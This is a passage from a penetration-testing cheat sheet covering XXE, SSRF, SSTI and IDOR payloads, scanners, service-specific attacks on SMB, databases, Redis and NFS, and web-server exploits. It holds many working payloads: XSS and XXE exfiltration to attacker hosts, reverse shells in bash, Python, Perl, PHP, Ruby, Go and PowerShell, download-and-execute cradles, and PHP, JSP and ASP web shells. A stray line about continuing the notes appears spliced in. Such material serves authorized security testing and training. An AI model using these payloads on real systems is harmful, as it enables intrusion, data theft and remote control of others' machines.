fetch('http://<LHOST>/?token='+token);
</script>

# Form submission 
<script>
document.forms[0].submit();
</script>

# Change admin password 
<script>
fetch('http://victim.com/change_password.php', {
  method: 'POST',
  body: 'password=hacked123',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'}
});
</script>
```

### 3.7 Advanced Vulnerability Classes

#### XXE (XML External Entity)

> üìñ **Reference**: [XXE Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/)

```xml
# Basic XXE - File disclosure 
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Windows file disclosure 
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>

# PHP wrapper for base64 encoding 
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>

# SSRF via XXE 
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<root>&xxe;</root>

# Out-of-band XXE (Blind) 
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<root></root>

# evil.dtd content 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

# XXE with parameter entities 
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://attacker.com/?%xxe;">
]>
<foo>&blind;</foo>

# Billion laughs attack (DoS) 
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

#### SSRF (Server-Side Request Forgery)

> üìñ **Reference**: [SSRF - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)

```bash
# Basic SSRF tests
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://internal-server

# Port scanning
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:3306
http://127.0.0.1:8080

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# Cloud metadata (Google Cloud)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Bypass filters with encoding
http://127.1
http://0177.0.0.1  # Octal
http://0x7f.0x0.0x0.0x1  # Hex
http://2130706433  # Decimal
http://017700000001  # Octal full

# DNS rebinding
http://spoofed.burpcollaborator.net

# URL encoding bypass
http://127.0.0.1 ‚Üí http://127%2E0%2E0%2E1
http://127.0.0.1 ‚Üí http://127%252E0%252E0%252E1

# Using redirects
http://attacker.com/redirect?url=http://127.0.0.1

# File protocols
file:///etc/passwd
file://\/\/etc/passwd
file:///c:/windows/win.ini

# Other protocols
gopher://127.0.0.1:3306
dict://127.0.0.1:11211
ftp://127.0.0.1
```

#### SSTI (Server-Side Template Injection)

> üìñ **Reference**: [SSTI - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)

```python
# Detection payloads
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

# Jinja2 (Python/Flask)
{{config}}
{{config.items()}}
{{settings.SECRET_KEY}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE via Jinja2
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# Smarty (PHP)
{system('id')}
{system('whoami')}

# ERB (Ruby)
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>

# Tornado (Python)
{{os.popen('whoami').read()}}

# Mako (Python)
${__import__('os').system('id')}

# Testing methodology
1. {{7*7}} ‚Üí Look for "49" in response
2. {{7*'7'}} ‚Üí Look for "7777777" (string multiplication)
3. Identify template engine from error messages
4. Use specific payload for that engine
```

#### IDOR (Insecure Direct Object Reference)

```bash
# Parameter tampering
GET /api/user/1234 ‚Üí Try /api/user/1235
GET /api/user/1234 ‚Üí Try /api/user/1
GET /download?file=invoice123.pdf ‚Üí Try invoice124.pdf

# UUID manipulation (if predictable)
GET /api/user/550e8400-e29b-41d4-a716-446655440000

# Base64 encoded IDs
GET /api/user/MTIzNA== (1234) ‚Üí Try MTIzNQ== (1235)

# Hash-based IDs (check for weak hashing)
GET /api/user/5f4dcc3b5aa765d61d8327deb882cf99

# Array-based access
GET /api/user?id[]=1&id[]=2&id[]=3

# Testing methodology
1. Identify all object references (IDs in URLs, POST data, cookies)
2. Create two test accounts
3. Try accessing Account A's resources as Account B
4. Try sequential, negative, and large numbers
5. Test all HTTP methods (GET, POST, PUT, DELETE)
6. Check for mass assignment vulnerabilities
```

### 3.8 Authentication and Authorization Testing

```bash
# Username enumeration
# Valid username: "Incorrect password"
# Invalid username: "User does not exist"

# Timing attacks for username enumeration
time curl -X POST http://target.com/login -d "user=admin&pass=wrong"
time curl -X POST http://target.com/login -d "user=invaliduser&pass=wrong"

# Password reset enumeration
# Valid: "Reset link sent"
# Invalid: "User not found"

# Session token analysis
# Weak tokens: sequential, timestamp-based, predictable
# Test for session fixation
# Test for session timeout
# Test for concurrent sessions

# Authorization bypass
# Horizontal privilege escalation (user ‚Üí user)
# Vertical privilege escalation (user ‚Üí admin)

# Path traversal in authorization
GET /api/user/../../admin/settings
GET /api/user/../admin/panel

# HTTP verb tampering
GET /admin/deleteUser?id=123 ‚Üí Forbidden
POST /admin/deleteUser?id=123 ‚Üí May work

# Header manipulation
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1

# JWT token testing (if used)
# Check for none algorithm
# Check for weak signing key
# Check for no signature verification
# Use jwt_tool for comprehensive testing
```

---

## 4 Automated Scanning (Support Role)

### 4.1 Nikto (Web Misconfiguration Scanner)

```bash
# Basic scan
nikto -h http://<RHOST>

# Scan with SSL
nikto -h https://<RHOST>

# Scan specific port
nikto -h http://<RHOST> -p 8080

# Multiple ports
nikto -h http://<RHOST> -p 80,443,8080,8443

# Scan with proxy (Burp)
nikto -h http://<RHOST> -useproxy http://127.0.0.1:8080

# Save output
nikto -h http://<RHOST> -o nikto_results.txt
nikto -h http://<RHOST> -Format htm -o nikto_results.html

# Scan with specific tuning
# 0 - File Upload
# 1 - Interesting File / Seen in logs
# 2 - Misconfiguration / Default File
# 3 - Information Disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote File Retrieval (Inside Web Root)
# 6 - Denial of Service
# 7 - Remote File Retrieval (Server Wide)
# 8 - Command Execution / Remote Shell
# 9 - SQL Injection
# a - Authentication Bypass
# b - Software Identification
# c - Remote Source Inclusion
# x - Reverse Tuning Options

nikto -h http://<RHOST> -Tuning 9  # SQL Injection only
nikto -h http://<RHOST> -Tuning 1,2,3,b  # Multiple options

# Comprehensive scan (longer runtime)
nikto -h http://<RHOST> -Tuning 123456789abc -Format htm -o comprehensive.html
```

### 4.2 Nuclei (Template-Based Vulnerability Scanning)

```bash
# Update templates
nuclei -update-templates

# Basic scan
nuclei -u http://<RHOST>

# Scan with specific severity
nuclei -u http://<RHOST> -severity critical,high

# Scan with specific tags
nuclei -u http://<RHOST> -tags cve,sqli,xss,rce
nuclei -u http://<RHOST> -tags apache,nginx,php
nuclei -u http://<RHOST> -tags wordpress,joomla,drupal

# Scan with specific templates
nuclei -u http://<RHOST> -t cves/
nuclei -u http://<RHOST> -t vulnerabilities/
nuclei -u http://<RHOST> -t exposed-panels/
nuclei -u http://<RHOST> -t misconfiguration/

# Scan specific CVEs
nuclei -u http://<RHOST> -t cves/2021/
nuclei -u http://<RHOST> -t cves/2021/CVE-2021-44228.yaml  # Log4Shell

# Scan multiple targets from file
nuclei -l targets.txt

# Output options
nuclei -u http://<RHOST> -o results.txt
nuclei -u http://<RHOST> -json -o results.json
nuclei -u http://<RHOST> -markdown -o results.md

# Rate limiting
nuclei -u http://<RHOST> -rate-limit 150

# Exclude specific templates
nuclei -u http://<RHOST> -etags dos

# Silent mode (only results)
nuclei -u http://<RHOST> -silent

# Comprehensive scan
nuclei -u http://<RHOST> -t cves/ -t vulnerabilities/ -t exposed-panels/ -t misconfiguration/ -severity critical,high,medium -o nuclei_scan.txt
```

### 4.3 WPScan (WordPress Vulnerability Scanner)

```bash
# Update database
wpscan --update

# Basic scan
wpscan --url http://<RHOST>

# Enumerate users
wpscan --url http://<RHOST> --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://<RHOST> --enumerate vp

# Enumerate all plugins
wpscan --url http://<RHOST> --enumerate ap

# Enumerate vulnerable themes
wpscan --url http://<RHOST> --enumerate vt

# Enumerate all themes
wpscan --url http://<RHOST> --enumerate at

# Full enumeration
wpscan --url http://<RHOST> --enumerate u,vp,vt,tt,cb,dbe

# Aggressive plugin detection
wpscan --url http://<RHOST> --enumerate ap --plugins-detection aggressive

# Password brute force (use carefully)
wpscan --url http://<RHOST> -U admin -P /usr/share/wordlists/rockyou.txt

# Custom wordlist for usernames
wpscan --url http://<RHOST> -U users.txt -P passwords.txt

# API token for vulnerability data (get free token from wpscan.com)
wpscan --url http://<RHOST> --api-token YOUR_TOKEN

# Output to file
wpscan --url http://<RHOST> --enumerate vp,vt,u -o wpscan_results.txt

# Ignore SSL warnings
wpscan --url https://<RHOST> --disable-tls-checks

# Comprehensive scan
wpscan --url http://<RHOST> --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive --api-token YOUR_TOKEN -o wpscan_full.txt
```

---

## 5 Service-Specific Vulnerability Checks

### 5.1 FTP Service (Port 21)

```bash
# Anonymous login test
ftp <RHOST>
# Username: anonymous
# Password: anonymous OR [blank]

# Using netexec
netexec ftp <RHOST> -u anonymous -p ''
netexec ftp <RHOST> -u ftp -p ftp

# Check version
nc -nv <RHOST> 21

# Nmap scripts
nmap --script ftp-anon <RHOST> -p 21
nmap --script ftp-bounce <RHOST> -p 21
nmap --script ftp-vsftpd-backdoor <RHOST> -p 21  # vsFTPd 2.3.4 backdoor

# File enumeration (if anonymous access)
ftp <RHOST>
> ls -la
> cd ..
> pwd
> get interesting_file.txt

# Upload test (if write permissions)
ftp <RHOST>
> put test.txt
> put shell.php

# FTP bounce attack
nmap -Pn -v -p 22,80 -b anonymous:anonymous@<FTP_IP> <RHOST>

# Known vulnerabilities
# vsFTPd 2.3.4 - Backdoor (CVE-2011-2523)
# ProFTPD 1.3.5 - mod_copy RCE
```

### 5.2 SSH Service (Port 22)

```bash
# Banner grabbing
nc <RHOST> 22
telnet <RHOST> 22

# Version detection
nmap -sV <RHOST> -p 22

# Supported algorithms
nmap --script ssh2-enum-algos <RHOST> -p 22

# Weak keys
nmap --script ssh-hostkey <RHOST> -p 22

# Authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" <RHOST> -p 22

# Check for username enumeration (CVE-2018-15473)
python3 ssh-username-enum.py --port 22 --userList users.txt <RHOST>

# Known vulnerabilities
# OpenSSH < 7.7 - User Enumeration (CVE-2018-15473)
# OpenSSH < 7.4 - Username Enumeration Timing Attack
# LibSSH 0.7.6 / 0.8.4 - Authentication Bypass (CVE-2018-10933)
```

### 5.3 SMB/NetBIOS Services (Ports 139, 445)

```bash
# Enumerate shares (null session)
smbclient -L //<RHOST>/ -N
smbclient -L //<RHOST>/ -U ''%''

# Connect to share
smbclient //<RHOST>/share_name -U username
smbclient //<RHOST>/C$ -U administrator

# Using netexec (formerly CrackMapExec)
netexec smb <RHOST>
netexec smb <RHOST> -u '' -p ''
netexec smb <RHOST> -u guest -p ''
netexec smb <RHOST> -u '' -p '' --shares
netexec smb <RHOST> -u guest -p '' --shares

# Enumerate users
netexec smb <RHOST> -u '' -p '' --users
enum4linux -a <RHOST>
rpcclient -U '' <RHOST>
> enumdomusers
> queryuser 0x1f4

# Download all files from share
smbget -R smb://<RHOST>/share_name/
mask ""
recurse ON
prompt OFF
mget *

# Check for signing
netexec smb <RHOST> --gen-relay-list relay_targets.txt

# Enumerate with enum4linux-ng
enum4linux-ng <RHOST> -A

# Nmap SMB scripts
nmap --script smb-enum-shares <RHOST> -p 445
nmap --script smb-enum-users <RHOST> -p 445
nmap --script smb-os-discovery <RHOST> -p 445
nmap --script smb-protocols <RHOST> -p 445
nmap --script smb-security-mode <RHOST> -p 445

# Vulnerability scanning
nmap --script smb-vuln* <RHOST> -p 445

# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 <RHOST> -p 445
python checker.py <RHOST>

# Print Nightmare (CVE-2021-1675)
rpcdump.py @<RHOST> | grep -i spoolss

# PetitPotam
python3 PetitPotam.py <LHOST> <RHOST>

# Known vulnerabilities
# MS08-067 (Windows XP/2003)
# MS17-010 EternalBlue (WannaCry)
# SMBGhost (CVE-2020-0796)
# SambaCry (CVE-2017-7494)
```

### 5.4 Database Services

#### MySQL/MariaDB (Port 3306)

```bash
# Connect with credentials
mysql -h <RHOST> -u root -p

# Try common passwords
mysql -h <RHOST> -u root -p''
mysql -h <RHOST> -u root -proot
mysql -h <RHOST> -u root -padmin

# Enumerate databases
mysql -h <RHOST> -u root -p -e "SHOW DATABASES;"

# Nmap scripts
nmap --script mysql-empty-password <RHOST> -p 3306
nmap --script mysql-info <RHOST> -p 3306
nmap --script mysql-databases --script-args="mysqluser=root,mysqlpass=''" <RHOST> -p 3306

# Remote UDF exploitation (if FILE privilege)
# Upload shared library and create UDF for command execution

# Read files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# Write files (if FILE privilege and OUTFILE enabled)
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

#### PostgreSQL (Port 5432)

```bash
# Connect with credentials
psql -h <RHOST> -U postgres

# Try default credentials
psql -h <RHOST> -U postgres -W  # Empty password
psql -h <RHOST> -U postgres -W  # Password: postgres

# List databases
psql -h <RHOST> -U postgres -l

# Connect to database
psql -h <RHOST> -U postgres -d database_name

# Nmap scripts
nmap --script pgsql-brute <RHOST> -p 5432

# Command execution (requires superuser)
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;

# Read files
SELECT pg_read_file('/etc/passwd', 0, 1000000);
```

#### MSSQL (Port 1433)

```bash
# Connect with impacket
impacket-mssqlclient sa@<RHOST>
impacket-mssqlclient sa:password@<RHOST> -windows-auth

# Using netexec
netexec mssql <RHOST> -u sa -p ''
netexec mssql <RHOST> -u sa -p password
netexec mssql <RHOST> -u sa -p password -x "whoami"

# Nmap scripts
nmap --script ms-sql-info <RHOST> -p 1433
nmap --script ms-sql-empty-password <RHOST> -p 1433
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password <RHOST> -p 1433

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
xp_cmdshell 'whoami'
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://<LHOST>/shell.ps1'')"'

# Steal NetNTLM hash
EXEC xp_dirtree '\\<LHOST>\share'
# Capture with responder: sudo responder -I tun0

# Read files
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x
```

#### MongoDB (Port 27017)

```bash
# Connect without authentication
mongo <RHOST>
mongo <RHOST>:27017

# List databases
show dbs

# Use database
use admin

# List collections
show collections

# Dump data
db.users.find()
db.users.find().pretty()

# Search for sensitive data
db.users.find({"role":"admin"})

# No authentication (if misconfigured)
curl http://<RHOST>:27017

# Nmap scripts
nmap --script mongodb-info <RHOST> -p 27017
nmap --script mongodb-databases <RHOST> -p 27017
```

#### Redis (Port 6379)

```bash
# Connect
redis-cli -h <RHOST>

# Authenticate (if password set)
AUTH password

# Get information
INFO
CONFIG GET *

# List all keys
KEYS *

# Get key value
GET key_name

# Web shell via cron (Linux)
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\n"
save

# Web shell via web directory
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php system($_GET['cmd']); ?>"
save

# SSH key persistence
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3...your_public_key...== \n\n"
save

# Nmap scripts
nmap --script redis-info <RHOST> -p 6379
```

### 5.5 Email Services

#### SMTP (Port 25, 587)

```bash
# Banner grabbing
nc <RHOST> 25
telnet <RHOST> 25

# Enumerate users
smtp-user-enum -M VRFY -U users.txt -t <RHOST>
smtp-user-enum -M EXPN -U users.txt -t <RHOST>
smtp-user-enum -M RCPT -U users.txt -t <RHOST>

# Manual enumeration
telnet <RHOST> 25
VRFY root
VRFY admin
EXPN root

# Send email (for phishing/log poisoning)
telnet <RHOST> 25
HELO attacker.com
MAIL FROM: attacker@attacker.com
RCPT TO: victim@victim.com
DATA
Subject: Test
Test email body
.
QUIT

# Nmap scripts
nmap --script smtp-commands <RHOST> -p 25
nmap --script smtp-enum-users <RHOST> -p 25
nmap --script smtp-open-relay <RHOST> -p 25
```

#### POP3 (Port 110)

```bash
# Connect
telnet <RHOST> 110

# Login
USER username
PASS password

# List emails
LIST

# Retrieve email
RETR 1

# Nmap scripts
nmap --script pop3-capabilities <RHOST> -p 110
nmap --script pop3-brute <RHOST> -p 110
```

#### IMAP (Port 143, 993)

```bash
# Connect
telnet <RHOST> 143

# Login
a001 LOGIN username password

# List mailboxes
a002 LIST "" "*"

# Select mailbox
a003 SELECT INBOX

# Fetch emails
a004 FETCH 1 BODY[]
```

I'll continue from where the notes left off and complete the remaining sections:

### 5.6 Web Server Specific

#### Apache HTTP Server

```bash
# Version detection
curl -I http://<RHOST>/
whatweb http://<RHOST>/

# Common misconfigurations
# Check for /server-status
curl http://<RHOST>/server-status
# Check for /server-info
curl http://<RHOST>/server-info

# HTTP methods testing
curl -X OPTIONS http://<RHOST>/ -I

# Virtual host enumeration
gobuster vhost -u http://<RHOST>/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Known vulnerabilities
# Apache 2.4.49/2.4.50 - Path Traversal (CVE-2021-41773)
curl --path-as-is http://<RHOST>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Apache 2.4.0-2.4.46 - RCE (CVE-2021-42013)
curl --path-as-is http://<RHOST>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd

# Log poisoning
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://<RHOST>/
```

#### Nginx

```bash
# Version detection
curl -I http://<RHOST>/
whatweb http://<RHOST>/

# Common misconfigurations
# Check for alias traversal
curl http://<RHOST>/files../etc/passwd
curl http://<RHOST>/..%2f..%2f..%2f..%2fetc/passwd

# Check for proxy misconfigurations
curl -H "Host: internal" http://<RHOST>/

# Known vulnerabilities
# Nginx 1.20.0 - 1.25.0 - Integer Overflow (CVE-2023-44487)
# Nginx 0.5.6-1.13.2 - Off-by-slash (CVE-2019-1551)
```

#### IIS (Internet Information Services)

```bash
# Version detection
curl -I http://<RHOST>/
nmap --script http-iis-webdav-vuln <RHOST> -p 80,443

# WebDAV testing
davtest -url http://<RHOST>/
cadaver http://<RHOST>/

# Shortname scanning (8.3 filenames)
nmap --script http-iis-short-name-brute <RHOST> -p 80

# Known vulnerabilities
# IIS 6.0 - WebDAV RCE (CVE-2017-7269)
# IIS 7.5 - Tilde enumeration
```

### 5.7 Network Services

#### SNMP (Port 161)

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>

# SNMP walk with public community
snmpwalk -c public -v1 <RHOST>
snmpwalk -c public -v2c <RHOST>

# SNMP enumeration
snmp-check <RHOST> -c public
snmp-check <RHOST> -c private

# Extract Windows user accounts
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25

# Extract running processes
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2

# Nmap scripts
nmap -sU -p 161 --script snmp-info <RHOST>
nmap -sU -p 161 --script snmp-brute <RHOST>
nmap -sU -p 161 --script "snmp-*" <RHOST>
```

#### NFS (Port 2049)

```bash
# Show NFS exports
showmount -e <RHOST>

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs <RHOST>:/share /mnt/nfs

# Mount with no_root_squash (if available)
mount -t nfs -o nolock <RHOST>:/share /mnt/nfs

# Check for no_root_squash in /etc/exports
cat /mnt/nfs/etc/exports

# Exploit no_root_squash
# On attacker: create SUID binary
cd /mnt/nfs
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF
gcc shell.c -o shell
chmod +s shell

# On victim: execute the binary
./shell
```

#### RDP (Port 3389)

```bash
# Check for BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 <RHOST>
nmap -p 3389 --script rdp-enum-encryption <RHOST>

# RDP connection
xfreerdp /v:<RHOST> /u:username /p:password
rdesktop <RHOST> -u username -p password

# Password spraying
netexec rdp <RHOST> -u users.txt -p 'Password123'

# Check for restricted admin mode
xfreerdp /v:<RHOST> /u:administrator /p:password /restricted-admin
```

#### LDAP (Port 389, 636)

```bash
# Anonymous bind
ldapsearch -h <RHOST> -x -b "dc=domain,dc=com"
ldapsearch -h <RHOST> -x -b "" -s base

# With credentials
ldapsearch -h <RHOST> -x -D "cn=admin,dc=domain,dc=com" -w password -b "dc=domain,dc=com"

# Nmap scripts
nmap -p 389 --script ldap-search <RHOST>
nmap -p 389 --script ldap-brute <RHOST>
```

#### WinRM (Port 5985, 5986)

```bash
# Check if WinRM is enabled
netexec winrm <RHOST> -u '' -p ''
netexec winrm <RHOST> -u administrator -p password

# Connect with Evil-WinRM
evil-winrm -i <RHOST> -u administrator -p password

# Password spraying
netexec winrm <RHOST> -u users.txt -p 'Password123'
```

---

## 6 Exploitation Path Selection

### 6.1 Stealth Considerations

```bash
# Low-noise techniques
# Use existing functionality vs. uploading new files
# Leverage built-in OS commands vs. custom payloads
# Use HTTPS for callbacks if available
# Consider timing to avoid detection

# High-noise techniques to avoid
# Mass port scanning
# Aggressive brute forcing
# Large file uploads
# Obvious reverse shells
```

### 6.2 Vulnerability Validation

```bash
# Test in this order:
1. Proof-of-Concept (non-destructive)
2. Limited impact verification
3. Full exploitation

# Example: SQL Injection validation
# Step 1: Basic injection test
' OR 1=1--

# Step 2: Data extraction test
' UNION SELECT NULL,NULL--

# Step 3: Full data extraction
' UNION SELECT username,password FROM users--
```

---

## 7 Reverse Shell Techniques

### 7.1 Listener Setup

```bash
# Netcat listener
nc -lvnp <LPORT>

# Netcat with verbose output
nc -lvnp <LPORT> -v

# Socat listener (more stable)
socat TCP-LISTEN:<LPORT>,reuseaddr,fork STDOUT

# MultiHandler (for staged payloads)
msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; exploit"

# PwnCat listener
pwncat-cs -lp <LPORT>
```

### 7.2 Reverse Shell Payloads

#### Linux Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Netcat (traditional)
nc -e /bin/sh <LHOST> <LPORT>

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<LHOST>:<LPORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
```

#### Windows Reverse Shells

```powershell
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell (one-liner)
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>"

# Netcat (if available)
nc.exe -e cmd.exe <LHOST> <LPORT>

# Certutil + nc
certutil -urlcache -f http://<LHOST>/nc.exe nc.exe && nc.exe <LHOST> <LPORT> -e cmd.exe

# MSFVenom generated
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
```

#### Web Shells

```php
<?php
// Basic PHP shell
system($_GET['cmd']);

// PHP shell with output
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

// PHP reverse shell
$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% 
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
    szTempFile = "C:\" & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If 
%>
```

---

## 8 Shell Stabilization and Upgrade

### 8.1 Linux Shell Stabilization

```bash
# Spawn PTY with Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade to full TTY
# Step 1: Background shell with Ctrl+Z
# Step 2: Configure terminal
stty raw -echo
# Step 3: Bring shell to foreground
fg
# Step 4: Set terminal type
export TERM=xterm-256color

# Alternative methods
# Using script
script -qc /bin/bash /dev/null

# Using socat (on attacker machine)
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
# On victim
socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Fix terminal size
stty rows 50 cols 200
```

### 8.2 Windows Shell Stabilization

```powershell
# PowerShell stabilization
powershell -nop -exec bypass

# Load PowerSploit modules
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')

# RDP enable (if admin)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Check for WinRM
Get-Service WinRM
Enable-PSRemoting -Force
```

---

## 9 Web Exploitation Paths to RCE

### 9.1 File Upload to RCE

```bash
# Test sequence:
1. Upload harmless file (test.txt)
2. Test file type restrictions
3. Test extension filters
4. Test content validation
5. Upload web shell
6. Execute commands

# Common upload locations:
